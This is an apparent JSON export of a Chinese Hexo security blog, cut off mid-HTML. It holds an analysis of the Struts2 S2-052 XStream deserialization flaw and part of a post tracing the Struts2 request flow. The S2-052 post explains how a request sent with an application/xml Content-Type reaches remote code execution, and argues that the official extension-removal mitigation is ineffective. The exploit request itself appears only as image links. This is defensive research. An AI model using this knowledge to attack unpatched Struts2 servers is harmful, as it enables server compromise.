XStream.fromXML对xml的内容进行反序列化\n\nfromXML方法见下图\n\n![lVqt7n.png](https://s2.ax1x.com/2019/12/27/lVqt7n.png)\n\nXStreamHandler并未对传入的Reader做过滤处理，因此导致反序列化漏洞的产生\n\n![lVqukt.png](https://s2.ax1x.com/2019/12/27/lVqukt.png)\n\n针对官方缓解措施的分析\n----------------------\n\n官方给出的缓解措施是修改struts-plugin.xml 中”struts.action.extension”属性，将xml字段从其中删除\n\nstruts.action.extension指定需要Struts2处理的请求后缀，该属性的默认值是action，即 所有匹配\\*.action的请求都由Struts2处理。如 果用户需要指定多个请求后缀，则多个后缀之间以英文逗号（，）隔开\n\n原始的struts-plugin.xml 配置如下\n\n![lVq8XQ.png](https://s2.ax1x.com/2019/12/27/lVq8XQ.png)\n\n通过上图可知：struts-plugin.xml 中的配置表明，后缀为\\*.xhtml，\\*.xml，\\*.json后缀的请求都有Struts2处理\n\n官方给出的缓解措施\n\n\\<constant name=\"struts.action.extension\" value=\"xhtml,,,json\" /\\>\n\n仅仅将配置中的xml去掉。也就是说，当出现\\*.xml后缀的请求，Struts2不再处理\n\n但是反观我们的poc\n\n![lVqat0.png](https://s2.ax1x.com/2019/12/27/lVqat0.png)\n\n并没有使用xml作为后缀\n\n程序是否使用XStreamHandler进行反序列化操作，仅仅是通过content-Type类型是否为application/xml来判断，因此缓解措施无效","source":"_posts/s2052.md","raw":"---\ntitle: Struts2 S2-052漏洞分析\ndate: 2019-6-30 18:21:12\ntags: [web漏洞分析 ,java]\ncategories: 技术\ncover: https://s2.ax1x.com/2019/12/27/lVXHHJ.md.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nStruts2 REST插件在使用xstreamhandler处理反序列化XML时没有进行任何过滤，从而导致远程执行代码，攻击者可以利用该漏洞构造恶意的XML内容获取服务器权限。\n\n<!--more-->\n\n漏洞分析\n--------\n\n首先看一下struts-plugin.xml配置文件，当Content-Type为xml时会调用XStreamHandler类进行处理\n\n![lVq36g.png](https://s2.ax1x.com/2019/12/27/lVq36g.png)\n\n在struts-plugin.xml配置文件中可见，当Content-Type为xml时会调用XStreamHandler类进行处理\n\n![lVqJmj.png](https://s2.ax1x.com/2019/12/27/lVqJmj.png)\n\n此外，从上图还可以看出xml是struts2请求中后缀的默认支持格式\n\n当请求报文中Content-Type为”application/xml”时，程序会调用XStreamHandler.toObject\n\n![lVqPfK.png](https://s2.ax1x.com/2019/12/27/lVqPfK.png)\n\ntoObject方法中将会调用XStream.fromXML对传入的xml的内容进行反序列化。在这个过程中，XStream没有对Reader做任何过滤处理\n\n我们通过调试代码来跟踪一下实际的流程\n\n首先我们构造如下数据包以触发漏洞\n\n![lVbbWT.png](https://s2.ax1x.com/2019/12/27/lVbbWT.png)\n\n构造如上图请求数据，将请求中的Content-Type设置为application/xml\n\n当请求进入struts2的Content-Type拦截器即ContentTypeInterceptor时，程序会根据请求中Content-Type类型寻找对应的handler，并调用handler进行反序列化操作，如下图\n\n![lVqklD.png](https://s2.ax1x.com/2019/12/27/lVqklD.png)\n\nContentTypeInterceptor具体的执行流程如下：\n\n1、程序通过getHandlerForRequest方法会判断提交的请求类型并使用对应的handler\n\n![lVqZmd.png](https://s2.ax1x.com/2019/12/27/lVqZmd.png)\n\n![lVqMff.png](https://s2.ax1x.com/2019/12/27/lVqMff.png)\n\n由上图可见，此时Content-Type为application/xml形式的请求对应的handler为XStreamHandler\n\n2、通过getContentLength方法获取提交的数据包长度，如果长度大于0则就获取其输入流并将其生成一个InputStreamReader对象赋值给reader，操作见下图红框\n\n![lVbjOJ.png](https://s2.ax1x.com/2019/12/27/lVbjOJ.png)\n\n3、调用对应handler的toObject方法将reader数据流进行xml反序列化\n\n![lVqST1.png](https://s2.ax1x.com/2019/12/27/lVqST1.png)\n\n通过上图可见，在这里对应的handler为XStreamHandler\n\n跟进XStreamHandler类的toObject方法\n\n![lVqUkq.png](https://s2.ax1x.com/2019/12/27/lVqUkq.png)\n\n![lVqY0s.png](https://s2.ax1x.com/2019/12/27/lVqY0s.png)\n\nXStreamHandler类中toObject方法调用 XStream.fromXML对xml的内容进行反序列化\n\nfromXML方法见下图\n\n![lVqt7n.png](https://s2.ax1x.com/2019/12/27/lVqt7n.png)\n\nXStreamHandler并未对传入的Reader做过滤处理，因此导致反序列化漏洞的产生\n\n![lVqukt.png](https://s2.ax1x.com/2019/12/27/lVqukt.png)\n\n针对官方缓解措施的分析\n----------------------\n\n官方给出的缓解措施是修改struts-plugin.xml 中”struts.action.extension”属性，将xml字段从其中删除\n\nstruts.action.extension指定需要Struts2处理的请求后缀，该属性的默认值是action，即 所有匹配\\*.action的请求都由Struts2处理。如 果用户需要指定多个请求后缀，则多个后缀之间以英文逗号（，）隔开\n\n原始的struts-plugin.xml 配置如下\n\n![lVq8XQ.png](https://s2.ax1x.com/2019/12/27/lVq8XQ.png)\n\n通过上图可知：struts-plugin.xml 中的配置表明，后缀为\\*.xhtml，\\*.xml，\\*.json后缀的请求都有Struts2处理\n\n官方给出的缓解措施\n\n\\<constant name=\"struts.action.extension\" value=\"xhtml,,,json\" /\\>\n\n仅仅将配置中的xml去掉。也就是说，当出现\\*.xml后缀的请求，Struts2不再处理\n\n但是反观我们的poc\n\n![lVqat0.png](https://s2.ax1x.com/2019/12/27/lVqat0.png)\n\n并没有使用xml作为后缀\n\n程序是否使用XStreamHandler进行反序列化操作，仅仅是通过content-Type类型是否为application/xml来判断，因此缓解措施无效","slug":"s2052","published":1,"updated":"2020-10-27T09:25:29.763Z","_id":"ckgrozu9y004mwsa96xolaxsb","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Struts2 REST插件在使用xstreamhandler处理反序列化XML时没有进行任何过滤，从而导致远程执行代码，攻击者可以利用该漏洞构造恶意的XML内容获取服务器权限。</p>\n<a id=\"more\"></a>\n\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>首先看一下struts-plugin.xml配置文件，当Content-Type为xml时会调用XStreamHandler类进行处理</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/27/lVq36g.png\" alt=\"lVq36g.png\"></p>\n<p>在struts-plugin.xml配置文件中可见，当Content-Type为xml时会调用XStreamHandler类进行处理</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/27/lVqJmj.png\" alt=\"lVqJmj.png\"></p>\n<p>此外，从上图还可以看出xml是struts2请求中后缀的默认支持格式</p>\n<p>当请求报文中Content-Type为”application/xml”时，程序会调用XStreamHandler.toObject</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/27/lVqPfK.png\" alt=\"lVqPfK.png\"></p>\n<p>toObject方法中将会调用XStream.fromXML对传入的xml的内容进行反序列化。在这个过程中，XStream没有对Reader做任何过滤处理</p>\n<p>我们通过调试代码来跟踪一下实际的流程</p>\n<p>首先我们构造如下数据包以触发漏洞</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/27/lVbbWT.png\" alt=\"lVbbWT.png\"></p>\n<p>构造如上图请求数据，将请求中的Content-Type设置为application/xml</p>\n<p>当请求进入struts2的Content-Type拦截器即ContentTypeInterceptor时，程序会根据请求中Content-Type类型寻找对应的handler，并调用handler进行反序列化操作，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/27/lVqklD.png\" alt=\"lVqklD.png\"></p>\n<p>ContentTypeInterceptor具体的执行流程如下：</p>\n<p>1、程序通过getHandlerForRequest方法会判断提交的请求类型并使用对应的handler</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/27/lVqZmd.png\" alt=\"lVqZmd.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/27/lVqMff.png\" alt=\"lVqMff.png\"></p>\n<p>由上图可见，此时Content-Type为application/xml形式的请求对应的handler为XStreamHandler</p>\n<p>2、通过getContentLength方法获取提交的数据包长度，如果长度大于0则就获取其输入流并将其生成一个InputStreamReader对象赋值给reader，操作见下图红框</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/27/lVbjOJ.png\" alt=\"lVbjOJ.png\"></p>\n<p>3、调用对应handler的toObject方法将reader数据流进行xml反序列化</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/27/lVqST1.png\" alt=\"lVqST1.png\"></p>\n<p>通过上图可见，在这里对应的handler为XStreamHandler</p>\n<p>跟进XStreamHandler类的toObject方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/27/lVqUkq.png\" alt=\"lVqUkq.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/27/lVqY0s.png\" alt=\"lVqY0s.png\"></p>\n<p>XStreamHandler类中toObject方法调用 XStream.fromXML对xml的内容进行反序列化</p>\n<p>fromXML方法见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/27/lVqt7n.png\" alt=\"lVqt7n.png\"></p>\n<p>XStreamHandler并未对传入的Reader做过滤处理，因此导致反序列化漏洞的产生</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/27/lVqukt.png\" alt=\"lVqukt.png\"></p>\n<h2 id=\"针对官方缓解措施的分析\"><a href=\"#针对官方缓解措施的分析\" class=\"headerlink\" title=\"针对官方缓解措施的分析\"></a>针对官方缓解措施的分析</h2><p>官方给出的缓解措施是修改struts-plugin.xml 中”struts.action.extension”属性，将xml字段从其中删除</p>\n<p>struts.action.extension指定需要Struts2处理的请求后缀，该属性的默认值是action，即 所有匹配*.action的请求都由Struts2处理。如 果用户需要指定多个请求后缀，则多个后缀之间以英文逗号（，）隔开</p>\n<p>原始的struts-plugin.xml 配置如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/27/lVq8XQ.png\" alt=\"lVq8XQ.png\"></p>\n<p>通过上图可知：struts-plugin.xml 中的配置表明，后缀为*.xhtml，*.xml，*.json后缀的请求都有Struts2处理</p>\n<p>官方给出的缓解措施</p>\n<p>&lt;constant name=”struts.action.extension” value=”xhtml,,,json” /&gt;</p>\n<p>仅仅将配置中的xml去掉。也就是说，当出现*.xml后缀的请求，Struts2不再处理</p>\n<p>但是反观我们的poc</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/27/lVqat0.png\" alt=\"lVqat0.png\"></p>\n<p>并没有使用xml作为后缀</p>\n<p>程序是否使用XStreamHandler进行反序列化操作，仅仅是通过content-Type类型是否为application/xml来判断，因此缓解措施无效</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>Struts2 REST插件在使用xstreamhandler处理反序列化XML时没有进行任何过滤，从而导致远程执行代码，攻击者可以利用该漏洞构造恶意的XML内容获取服务器权限。</p>","more":"<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>首先看一下struts-plugin.xml配置文件，当Content-Type为xml时会调用XStreamHandler类进行处理</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/27/lVq36g.png\" alt=\"lVq36g.png\"></p>\n<p>在struts-plugin.xml配置文件中可见，当Content-Type为xml时会调用XStreamHandler类进行处理</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/27/lVqJmj.png\" alt=\"lVqJmj.png\"></p>\n<p>此外，从上图还可以看出xml是struts2请求中后缀的默认支持格式</p>\n<p>当请求报文中Content-Type为”application/xml”时，程序会调用XStreamHandler.toObject</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/27/lVqPfK.png\" alt=\"lVqPfK.png\"></p>\n<p>toObject方法中将会调用XStream.fromXML对传入的xml的内容进行反序列化。在这个过程中，XStream没有对Reader做任何过滤处理</p>\n<p>我们通过调试代码来跟踪一下实际的流程</p>\n<p>首先我们构造如下数据包以触发漏洞</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/27/lVbbWT.png\" alt=\"lVbbWT.png\"></p>\n<p>构造如上图请求数据，将请求中的Content-Type设置为application/xml</p>\n<p>当请求进入struts2的Content-Type拦截器即ContentTypeInterceptor时，程序会根据请求中Content-Type类型寻找对应的handler，并调用handler进行反序列化操作，如下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/27/lVqklD.png\" alt=\"lVqklD.png\"></p>\n<p>ContentTypeInterceptor具体的执行流程如下：</p>\n<p>1、程序通过getHandlerForRequest方法会判断提交的请求类型并使用对应的handler</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/27/lVqZmd.png\" alt=\"lVqZmd.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/12/27/lVqMff.png\" alt=\"lVqMff.png\"></p>\n<p>由上图可见，此时Content-Type为application/xml形式的请求对应的handler为XStreamHandler</p>\n<p>2、通过getContentLength方法获取提交的数据包长度，如果长度大于0则就获取其输入流并将其生成一个InputStreamReader对象赋值给reader，操作见下图红框</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/27/lVbjOJ.png\" alt=\"lVbjOJ.png\"></p>\n<p>3、调用对应handler的toObject方法将reader数据流进行xml反序列化</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/27/lVqST1.png\" alt=\"lVqST1.png\"></p>\n<p>通过上图可见，在这里对应的handler为XStreamHandler</p>\n<p>跟进XStreamHandler类的toObject方法</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/27/lVqUkq.png\" alt=\"lVqUkq.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/12/27/lVqY0s.png\" alt=\"lVqY0s.png\"></p>\n<p>XStreamHandler类中toObject方法调用 XStream.fromXML对xml的内容进行反序列化</p>\n<p>fromXML方法见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/27/lVqt7n.png\" alt=\"lVqt7n.png\"></p>\n<p>XStreamHandler并未对传入的Reader做过滤处理，因此导致反序列化漏洞的产生</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/27/lVqukt.png\" alt=\"lVqukt.png\"></p>\n<h2 id=\"针对官方缓解措施的分析\"><a href=\"#针对官方缓解措施的分析\" class=\"headerlink\" title=\"针对官方缓解措施的分析\"></a>针对官方缓解措施的分析</h2><p>官方给出的缓解措施是修改struts-plugin.xml 中”struts.action.extension”属性，将xml字段从其中删除</p>\n<p>struts.action.extension指定需要Struts2处理的请求后缀，该属性的默认值是action，即 所有匹配*.action的请求都由Struts2处理。如 果用户需要指定多个请求后缀，则多个后缀之间以英文逗号（，）隔开</p>\n<p>原始的struts-plugin.xml 配置如下</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/27/lVq8XQ.png\" alt=\"lVq8XQ.png\"></p>\n<p>通过上图可知：struts-plugin.xml 中的配置表明，后缀为*.xhtml，*.xml，*.json后缀的请求都有Struts2处理</p>\n<p>官方给出的缓解措施</p>\n<p>&lt;constant name=”struts.action.extension” value=”xhtml,,,json” /&gt;</p>\n<p>仅仅将配置中的xml去掉。也就是说，当出现*.xml后缀的请求，Struts2不再处理</p>\n<p>但是反观我们的poc</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/27/lVqat0.png\" alt=\"lVqat0.png\"></p>\n<p>并没有使用xml作为后缀</p>\n<p>程序是否使用XStreamHandler进行反序列化操作，仅仅是通过content-Type类型是否为application/xml来判断，因此缓解措施无效</p>"},{"title":"Struts2 框架分析","date":"2019-09-20T06:25:46.000Z","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/机器学习算法2.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nStruts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。\n\nStruts2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开\n\n<!--more-->\n\n首先我们来看下Struts2的架构图\n\n![le2CrV.png](https://s2.ax1x.com/2019/12/28/le2CrV.png)\n\n上图中的Key，介绍如下：\n\n-   **Servlet Filters：过滤器链，客户端的所有请求都要经过Filter链的处理。**\n\n-   **StrutsCore：Struts2的核心部分，但是Struts2已经帮我们做好了，我们不需要去做这个**\n\n-   **Interceptors，Struts2的拦截器。Struts2提供了很多默认的拦截器，可以完成日常开发的绝大部分工作；而我们自定义的拦截器，用来实现实际的客户业务需要的功能。**\n\n-   **UserCreated，由开发人员创建的，包括struts.xml、Action、Template，这些是每个使用Struts2来进行开发的人员都必须会的。**\n\n\n\n上图中的各个元素，介绍如下\n\n**FilterDispatcher/StrutsPrepareAndExecuteFilter**\n\nFilterDispatcher**/**StrutsPrepareAndExecuteFilter是整个Struts2的核心过滤器，它将拦截请求并。在Struts的版本>= 2.1.3，推荐升级到新的Filter-StrutsPrepareAndExecuteFilte\n\n![legf4H.png](https://s2.ax1x.com/2019/12/28/legf4H.png)\n\n\n\n**ActionMapper**\n\nFilterDispatcher/StrutsPrepareAndExecuteFilter将会调用ActionMapper处理请求过来的url，判断该请求是否需要struts2来进行处理，如果需要会返回一个包含了actionName,namespace等信息的ActionMapping对象\n\n![legsjx.png](https://s2.ax1x.com/2019/12/28/legsjx.png)\n\n\n\n**ActionProxy**\n\nActionProxy用来创建一个ActionInvocation代理实例，除此之外，ActionProxy还会调用ConfigurationManager去读取struts.xml的配置\n\n![legovt.png](https://s2.ax1x.com/2019/12/28/legovt.png)\n\n\n\n**ConfigurationManager**\n\nConfigurationManager用来读取struts.xml配置\n\n![leg4Cd.png](https://s2.ax1x.com/2019/12/28/leg4Cd.png)\n\n**struts.xml**\n\nstruts.xml是Stuts2的应用配置文件\n\n![leg6u6.png](https://s2.ax1x.com/2019/12/28/leg6u6.png)\n\n\n\n**ActionInvocation**\n\n通过ActionMapper返回的actionName,namespace等信息调用拦截器并执行Action\n\n![legx8s.png](https://s2.ax1x.com/2019/12/28/legx8s.png)\n\n\n\n**Interceptor**\n\nInterceptor是Struts2中的拦截器。在Action运行之前或者Result运行之后来进行执行。默认的Interceptor个数为20个\n\n![le2FVU.png](https://s2.ax1x.com/2019/12/28/le2FVU.png)\n\n\n\n**Action**\n\nAction为开发人员编写的，用来处理请求以及封装数据的模块\n\n\n\nStruts2执行流程跟踪\n-------------------\n\n首先我们在Struts2的调度中心——StrutsPrepareAndExecuteFilter中的doFilter方法中打个断点\n\n![legRED.png](https://s2.ax1x.com/2019/12/28/legRED.png)\n\n当Web容器收到请求（HttpServletRequest），在它将请求传递给ActionContextCleanUp、Other\nfilters(SiteMesh,etc)之后，容器将调用FilterDispatcher核心控制器。正如上图所示，程序将会执行到doFilter方法中。\n\n在doFilter方法中，将会判断请求是否应该由struts2处理**，**下图红框中的代码就是用来进行这步操作\n\n![legbb8.png](https://s2.ax1x.com/2019/12/28/legbb8.png)\n\n不由struts2处理的请求，将会被doFilter放行，见上图127行\n\n接着doFilter方法中将会调用ActionMapper处理请求，ActionMapper用来确定请求哪个Action并返回一个ActionMaping对象(mapping),mapping中封装了actionName和namespace等信息\n\n![legz2n.png](https://s2.ax1x.com/2019/12/28/legz2n.png)\n\n![le2A54.png](https://s2.ax1x.com/2019/12/28/le2A54.png)\n\nmapping中封装了请求action的Name以及namespace等信息\n\n当Mapping不为空时，FilterDispatcher将控制权委派给ActionProxy，下面一些列图片将展示控制权委派的过程\n\n![legHDf.png](https://s2.ax1x.com/2019/12/28/legHDf.png)\n\n当Mapping不为空时，执行executeAction方法，并传入ActionMaping对象(mapping)\n\n继续跟入executeAction\n\n![legX5Q.png](https://s2.ax1x.com/2019/12/28/legX5Q.png)\n\nexecuteAction中调用serviceAction方法\n\n继续跟入serviceAction\n\n![legIgI.png](https://s2.ax1x.com/2019/12/28/legIgI.png)\n\n从上图红框处可见，程序根据mapping中的信息创建创建一个名为proxy的ActionProxy对象\n\n接着，执行proxy.execute()方法\n\n![legcDK.png](https://s2.ax1x.com/2019/12/28/legcDK.png)\n\n跟入execute方法，进入DefaultActionProxy\n\n![leg58A.png](https://s2.ax1x.com/2019/12/28/leg58A.png)\n\n接着进入DefaultActionInvocation\n\n![le2Svq.png](https://s2.ax1x.com/2019/12/28/le2Svq.png)\n\n在DefaultActionInvocation中，程序将会加载拦截器\n\n加载的默认拦截器共20个，见下图\n\n![leggHO.png](https://s2.ax1x.com/2019/12/28/leggHO.png)\n\n当所有拦截器调用完毕，ActionInvocation调用Action\n\n![legOUg.png](https://s2.ax1x.com/2019/12/28/legOUg.png)\n\n最终，请求中对应的开发的人员编写的action将会被加载\n\n![leg7KP.png](https://s2.ax1x.com/2019/12/28/leg7KP.png)\n\n一旦执行结果返回结果字符串，ActionInvocation将查找结果字符串对应的(Result）然后调用对应的模版（JSP）来呈现页面。","source":"_posts/struts2mvc.md","raw":"---\ntitle: Struts2 框架分析\ndate: 2019-9-20 14:25:46\ntags: [web漏洞分析 ,java]\ncategories: 技术\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/机器学习算法2.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nStruts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。\n\nStruts2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开\n\n<!--more-->\n\n首先我们来看下Struts2的架构图\n\n![le2CrV.png](https://s2.ax1x.com/2019/12/28/le2CrV.png)\n\n上图中的Key，介绍如下：\n\n-   **Servlet Filters：过滤器链，客户端的所有请求都要经过Filter链的处理。**\n\n-   **StrutsCore：Struts2的核心部分，但是Struts2已经帮我们做好了，我们不需要去做这个**\n\n-   **Interceptors，Struts2的拦截器。Struts2提供了很多默认的拦截器，可以完成日常开发的绝大部分工作；而我们自定义的拦截器，用来实现实际的客户业务需要的功能。**\n\n-   **UserCreated，由开发人员创建的，包括struts.xml、Action、Template，这些是每个使用Struts2来进行开发的人员都必须会的。**\n\n\n\n上图中的各个元素，介绍如下\n\n**FilterDispatcher/StrutsPrepareAndExecuteFilter**\n\nFilterDispatcher**/**StrutsPrepareAndExecuteFilter是整个Struts2的核心过滤器，它将拦截请求并。在Struts的版本>= 2.1.3，推荐升级到新的Filter-StrutsPrepareAndExecuteFilte\n\n![legf4H.png](https://s2.ax1x.com/2019/12/28/legf4H.png)\n\n\n\n**ActionMapper**\n\nFilterDispatcher/StrutsPrepareAndExecuteFilter将会调用ActionMapper处理请求过来的url，判断该请求是否需要struts2来进行处理，如果需要会返回一个包含了actionName,namespace等信息的ActionMapping对象\n\n![legsjx.png](https://s2.ax1x.com/2019/12/28/legsjx.png)\n\n\n\n**ActionProxy**\n\nActionProxy用来创建一个ActionInvocation代理实例，除此之外，ActionProxy还会调用ConfigurationManager去读取struts.xml的配置\n\n![legovt.png](https://s2.ax1x.com/2019/12/28/legovt.png)\n\n\n\n**ConfigurationManager**\n\nConfigurationManager用来读取struts.xml配置\n\n![leg4Cd.png](https://s2.ax1x.com/2019/12/28/leg4Cd.png)\n\n**struts.xml**\n\nstruts.xml是Stuts2的应用配置文件\n\n![leg6u6.png](https://s2.ax1x.com/2019/12/28/leg6u6.png)\n\n\n\n**ActionInvocation**\n\n通过ActionMapper返回的actionName,namespace等信息调用拦截器并执行Action\n\n![legx8s.png](https://s2.ax1x.com/2019/12/28/legx8s.png)\n\n\n\n**Interceptor**\n\nInterceptor是Struts2中的拦截器。在Action运行之前或者Result运行之后来进行执行。默认的Interceptor个数为20个\n\n![le2FVU.png](https://s2.ax1x.com/2019/12/28/le2FVU.png)\n\n\n\n**Action**\n\nAction为开发人员编写的，用来处理请求以及封装数据的模块\n\n\n\nStruts2执行流程跟踪\n-------------------\n\n首先我们在Struts2的调度中心——StrutsPrepareAndExecuteFilter中的doFilter方法中打个断点\n\n![legRED.png](https://s2.ax1x.com/2019/12/28/legRED.png)\n\n当Web容器收到请求（HttpServletRequest），在它将请求传递给ActionContextCleanUp、Other\nfilters(SiteMesh,etc)之后，容器将调用FilterDispatcher核心控制器。正如上图所示，程序将会执行到doFilter方法中。\n\n在doFilter方法中，将会判断请求是否应该由struts2处理**，**下图红框中的代码就是用来进行这步操作\n\n![legbb8.png](https://s2.ax1x.com/2019/12/28/legbb8.png)\n\n不由struts2处理的请求，将会被doFilter放行，见上图127行\n\n接着doFilter方法中将会调用ActionMapper处理请求，ActionMapper用来确定请求哪个Action并返回一个ActionMaping对象(mapping),mapping中封装了actionName和namespace等信息\n\n![legz2n.png](https://s2.ax1x.com/2019/12/28/legz2n.png)\n\n![le2A54.png](https://s2.ax1x.com/2019/12/28/le2A54.png)\n\nmapping中封装了请求action的Name以及namespace等信息\n\n当Mapping不为空时，FilterDispatcher将控制权委派给ActionProxy，下面一些列图片将展示控制权委派的过程\n\n![legHDf.png](https://s2.ax1x.com/2019/12/28/legHDf.png)\n\n当Mapping不为空时，执行executeAction方法，并传入ActionMaping对象(mapping)\n\n继续跟入executeAction\n\n![legX5Q.png](https://s2.ax1x.com/2019/12/28/legX5Q.png)\n\nexecuteAction中调用serviceAction方法\n\n继续跟入serviceAction\n\n![legIgI.png](https://s2.ax1x.com/2019/12/28/legIgI.png)\n\n从上图红框处可见，程序根据mapping中的信息创建创建一个名为proxy的ActionProxy对象\n\n接着，执行proxy.execute()方法\n\n![legcDK.png](https://s2.ax1x.com/2019/12/28/legcDK.png)\n\n跟入execute方法，进入DefaultActionProxy\n\n![leg58A.png](https://s2.ax1x.com/2019/12/28/leg58A.png)\n\n接着进入DefaultActionInvocation\n\n![le2Svq.png](https://s2.ax1x.com/2019/12/28/le2Svq.png)\n\n在DefaultActionInvocation中，程序将会加载拦截器\n\n加载的默认拦截器共20个，见下图\n\n![leggHO.png](https://s2.ax1x.com/2019/12/28/leggHO.png)\n\n当所有拦截器调用完毕，ActionInvocation调用Action\n\n![legOUg.png](https://s2.ax1x.com/2019/12/28/legOUg.png)\n\n最终，请求中对应的开发的人员编写的action将会被加载\n\n![leg7KP.png](https://s2.ax1x.com/2019/12/28/leg7KP.png)\n\n一旦执行结果返回结果字符串，ActionInvocation将查找结果字符串对应的(Result）然后调用对应的模版（JSP）来呈现页面。","slug":"struts2mvc","published":1,"updated":"2020-10-28T01:04:04.057Z","_id":"ckgrozua0004pwsa988o86wg1","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。</p>\n<p>Struts2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开</p>\n<a id=\"more\"></a>\n\n<p>首先我们来看下Struts2的架构图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/le2CrV.png\" alt=\"le2CrV.png\"></p>\n<p>上图中的Key，介绍如下：</p>\n<ul>\n<li><p><strong>Servlet Filters：过滤器链，客户端的所有请求都要经过Filter链的处理。</strong></p>\n</li>\n<li><p><strong>StrutsCore：Struts2的核心部分，但是Struts2已经帮我们做好了，我们不需要去做这个</strong></p>\n</li>\n<li><p><strong>Interceptors，Struts2的拦截器。Struts2提供了很多默认的拦截器，可以完成日常开发的绝大部分工作；而我们自定义的拦截器，用来实现实际的客户业务需要的功能。</strong></p>\n</li>\n<li><p><strong>UserCreated，由开发人员创建的，包括struts.xml、Action、Template，这些是每个使用Struts2来进行开发的人员都必须会的。</strong></p>\n</li>\n</ul>\n<p>上图中的各个元素，介绍如下</p>\n<p><strong>FilterDispatcher/StrutsPrepareAndExecuteFilter</strong></p>\n<p>FilterDispatcher**/**StrutsPrepareAndExecuteFilter是整个Struts2的核心过滤器，它将拦截请求并。在Struts的版本&gt;= 2.1.3，推荐升级到新的Filter-StrutsPrepareAndExecuteFilte</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/legf4H.png\" alt=\"legf4H.png\"></p>\n<p><strong>ActionMapper</strong></p>\n<p>FilterDispatcher/StrutsPrepareAndExecuteFilter将会调用ActionMapper处理请求过来的url，判断该请求是否需要struts2来进行处理，如果需要会返回一个包含了actionName,namespace等信息的ActionMapping对象</p>\n<p><img src= 